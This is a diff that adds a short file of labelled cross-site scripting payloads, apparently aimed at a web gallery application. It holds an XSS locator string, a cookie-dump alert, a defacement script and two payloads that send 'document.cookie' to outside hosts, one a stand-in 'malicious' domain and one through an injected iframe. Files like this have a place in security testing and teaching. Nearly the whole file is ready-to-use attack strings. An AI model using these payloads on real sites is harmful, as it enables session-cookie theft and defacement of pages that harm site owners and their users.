@@ -1,0 +1,14 @@
+ATTACK - XSS locator
+        ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+
+ATTACK - Cookie Dump
+        " /><script>alert(document.cookie);</script>
+
+ATTACK - Defacing 
+        " /><script>$('#header').html('<h1>This gallery sucks</h1>');</script>
+        
+ATTACK - AJAX - This won't work.
+        " /><script>var x = $.get('http://my.malicious.domain?cookie=' + document.cookie);</script>
+    
+ATTACK - iframe injection
+        " /><script>$('#header').html('<iframe src="http://jeffandolora.com?cookie=' + document.cookie + '"></iframe>');</script>
